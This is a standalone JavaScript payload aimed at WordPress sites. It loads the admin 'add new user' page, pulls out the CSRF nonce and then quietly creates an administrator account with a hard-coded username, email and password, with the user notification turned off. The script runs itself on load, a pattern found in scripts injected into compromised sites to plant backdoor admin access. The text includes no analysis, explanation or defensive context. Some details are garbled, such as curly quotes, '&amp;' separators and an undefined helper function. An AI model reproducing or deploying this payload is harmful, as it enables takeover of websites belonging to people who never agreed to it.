function addAdminUser()
{
   var uri = “/wp-admin/user-new.php”;
   var username  = “adminx”;
   var email     = “Cyberwarz894@proton.me”;
   var password  = “Sakadeliboyz”;

   xhr = new XMLHttpRequest();

   xhr.open(“GET”, uri, true);
   xhr.send(null);

   xhr.onreadystatechange = function()
 {
    if (xhr.readyState == XMLHttpRequest.DONE)
    {
       // Parse out the nonce
       var response = read_body(xhr);
       var noncePos = response.indexOf(‘name=”_wpnonce_create-user” value=”‘);
       console.log(“Nonce string index is: ” + noncePos);

       var nonceVal = response.substring(noncePos + 35, noncePos + 45);
       console.log(“Nonce substring is: ” + nonceVal);

// Now add the user using our nonce
       console.log(“Adding the user…”);
       xhr = new XMLHttpRequest();
       xhr.open(“POST”, uri);
       xhr.setRequestHeader(“Content-Type”, “application/x-www-form-urlencoded”);

       var body = “action=createuser&amp;”;
       body += “_wpnonce_create-user=” + nonceVal + “&amp;”;
       body += “_wp_http_referer=%2Fwp-admin%2Fuser-new.php&amp;”;
       body += “user_login=” + username + “&amp;”;
       body += “email=” + email + “&amp;”;
       body += “first_name=&amp;”;
       body += “last_name=&amp;”;
       body += “uri=&amp;”;
 
       body += “pass1=” + password + “&amp;”;
       body += “pass1-text=” + password + “&amp;”;
       body += “pass2=” + password + “&amp;”;
       body += “pw_weak=on&amp;”;

       body += “send_user_notification=0&amp;”;
       body += “role=administrator&amp;”;
       body += “ure_select_other_roles=&amp;”;
       body += “createuser=Add+New+User”;

       xhr.send(body);
     }
   }
 }
 addAdminUser();

 